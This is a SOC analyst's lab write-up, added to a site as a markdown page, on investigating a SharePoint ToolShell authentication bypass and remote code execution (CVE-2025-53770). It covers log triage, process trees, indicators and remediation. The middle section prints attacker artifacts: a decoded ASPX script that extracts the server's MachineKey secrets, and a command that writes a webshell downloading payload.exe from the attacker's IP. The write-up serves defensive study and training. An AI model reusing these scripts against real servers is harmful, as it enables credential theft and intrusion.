@@ -7,3 +7,144 @@ redirect: https://www.wikipedia.org/
 importance: 3
 category: work
 ---
+# Incident Write-Up: SharePoint ToolShell Auth Bypass & RCE (CVE-2025-53770)
+
+**Author:** Kidd Gomez  
+**Role:** SOC Analyst  
+**Lab Platform:** LetsDefend.io  
+**Alert ID:** SOC342  
+**Severity:** Critical  
+**Status:** Closed - True Positive  
+
+---
+
+## Incident Overview
+
+| Parameter | Details |
+| :--- | :--- |
+| **Alert Name** | SOC342 - SharePoint ToolShell Auth Bypass and RCE |
+| **CVE Identifier** | CVE-2025-53770 |
+| **Impacted Asset** | Internal Web Server (Microsoft SharePoint) |
+| **Target Application** | IIS / Microsoft SharePoint Server |
+| **Attacker Activity** | Authentication Bypass & Arbitrary Command Execution |
+| **Final Classification** | True Positive (Malicious Activity Confirmed) |
+
+---
+## 1. Pre-Investigation
+
+<img width="1920" height="1032" alt="chrome_PoY5DEySf0" src="https://github.com/user-attachments/assets/3e20d2c4-45bc-4dd9-8e48-ebbe7feb7241" />
+
+
+The first thing I did was make sure to note down in notepad of the source IP, Destination IP, Hostname, HTTP Request Method, and USER-Agent for future reference so I wouldn't have to keep going back to check.
+
+## 2. Threat & Vulnerability Context
+
+**CVE-2025-53770 (ToolShell)** is a critical vulnerability affecting Microsoft SharePoint instances. It permits an unauthenticated attacker to craft malicious HTTP requests that bypass built-in authentication filters and reach protected endpoints or trigger unsafe object deserialization.
+
+Successful exploitation results in **Remote Code Execution (RCE)** executed directly under the context of the IIS worker process (`w3wp.exe`).
+
+I Checked the NVD for CVE-2025-53770 so i could get a better understanding of the vulnerability that i was investigating.
+
+
+<img width="1722" height="777" alt="chrome_w9AAV4LmA4" src="https://github.com/user-attachments/assets/f239dbea-5067-4502-897d-c91542c9ece3" />
+
+
+---
+
+## 3. Step-by-Step Investigation Workflow
+
+### Step 1: Initial Alert Triage & Scope Definition
+* **Alert Signal:** SIEM triggered a high-severity alert (`SOC342`) for an abnormal request sequence targeted at the internal SharePoint web application.
+* **Objective:** Verify whether the incoming HTTP payload was successful (HTTP `200 OK` response) and evaluate whether process creation events followed the web request.
+
+### Step 2: Network & Web Server Log Analysis
+* **Web Server / WAF Logs Analysis:**
+  * After I checked network logs I, seen attacker IP (107.191.58.76) revealed HTTP traffic directed at SharePoint01:Request Type: HTTP POST  Target Endpoint: /_layouts/15/ToolPane.aspx?DisplayMode=Edit
+  * Vulnerability Context (CVE-2025-53770):The combination of the POST payload to ToolPane.aspx along with the manipulated SignOut.aspx referer bypasses SharePoint's authentication checks (ToolShell flaw).  This grant allowed the remote attacker to drop ASPX files into the web root without authenticating.
+ 
+
+
+
+  
+### Step 3: Endpoint Behavioral Analysis & Payload Verification
+Analyzing EDR/Endpoint process trees and command lines on `SharePoint01` confirmed remote command execution:
+
+1. **Malicious Process Execution Chain:**
+   * `w3wp.exe` -> `cmd.exe` -> `powershell.exe -EncodedCommand ...`
+   * The IIS Worker process (`w3wp.exe`) spawned command interpreters—a classic signature of web server exploitation.
+2. **Payload Extraction & CyberChef Decoding:**
+   * Extracting and decoding the base64-encoded string from the PowerShell command revealed attempts to harvest the server's IIS `MachineKey` (`ValidationKey` and `DecryptionKey`).
+   * The payload also generated an ASPX webshell (`spinstall0.aspx`) written directly to the `/_layouts/` directory to preserve backdoor access.
+   
+## Scripts in order
+
+<img width="1885" height="780" alt="chrome_U4WwOObrH0" src="https://github.com/user-attachments/assets/82056b2a-c37e-45ac-907a-3d317f8901b6" />
+
+<img width="1871" height="774" alt="chrome_A8J7cd8tB6" src="https://github.com/user-attachments/assets/d28026db-33a8-4921-9491-95f6397bec76" />
+
+<img width="1920" height="1032" alt="chrome_XQA83WInbv" src="https://github.com/user-attachments/assets/f457b30c-50e1-481b-947a-6f46decf0f03" />
+
+After encoxded using cyberchef
+<script runat="server" language="c#">
+public void Page_load()
+{
+    var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+    var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
+    var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
+    var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
+    Response.Write(cg.ValidationKey + "|" + cg.Validation + "|" + cg.DecryptionKey + "|" + cg.Decryption + "|" + cg.CompatibilityMode);
+}
+</script>
+
+What This Script Does
+This script abuses .NET reflection to access private configuration and extract:
+
+ValidationKey
+DecryptionKey
+Encryption mode + compatibility settings
+
+after that 
+
+csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
+
+cmd.exe /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form>> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
+
+   
+## Malicious ASPX Webshell (spinstall0.aspx)
+Creates a malicious ASPX file (spinstall0.aspx) directly in the SharePoint layouts directory
+Embeds an <object> ActiveX tag that points to: http://107.191.58.76/payload.exe
+Acts as a remote downloader when the page is visited by a browser or triggered internally
+
+* To make sure APSX file is malicious we checked Virus Total and Threat Detection Tab.
+
+<img width="1920" height="1032" alt="chrome_6ytWBq4csx" src="https://github.com/user-attachments/assets/01f86581-e68d-4667-a9ab-5df46120bde6" />
+
+<img width="1853" height="375" alt="chrome_g43z1fiJUP" src="https://github.com/user-attachments/assets/cf87961b-51fe-47eb-a6df-47f52b17c896" />
+
+
+
+---
+
+## 4. Root Cause Analysis & Detection Findings
+
+* **Root Cause:** An unpatched, network-accessible Microsoft SharePoint application vulnerable to **CVE-2025-53770**, which allowed authentication bypass and arbitrary code execution.
+* **Key Indicators of Compromise (IOCs):**
+  * **Parent Process:** `w3wp.exe` spawning command execution shells (`cmd.exe` / `powershell.exe`).
+  * **Network Patterns:** HTTP requests targeting administrative or API endpoints with non-standard header fields yielding `HTTP 200`.
+
+---
+
+## 5. Containment, Eradication & Remediation
+
+1. **Host Isolation:** Isolated the target SharePoint server from the internal network via EDR control to prevent lateral movement while keeping agent communication open for investigation.
+2. **Process Termination & Artifact Cleanup:** Terminated active malicious `cmd.exe`/`powershell.exe` processes and removed any web shell files dropped on the host.
+3. **Patch Management:** Applied Microsoft's security patch addressing **CVE-2025-53770**.
+4. **Credential & Token Invalidation:** Reset credentials for the SharePoint service account (`AppPool`) and revoked active authentication tokens across the domain environment.
+
+---
+
+## 6. Defensive Recommendations
+
+* **Process Spawning Detection:** Deploy SIEM/EDR detection rules flagging any command shell process (`cmd.exe`, `powershell.exe`, `wmic.exe`) spawned by web server processes (`w3wp.exe`, `httpd`, `nginx`).
+* **WAF Filtering:** Configure Web Application Firewall signatures to inspect and block malformed HTTP header combinations targeting SharePoint internal endpoints.
+* **Least Privilege Enforcement:** Enforce strict service account privileges so web application pools lack rights to interact with host administrative utilities.
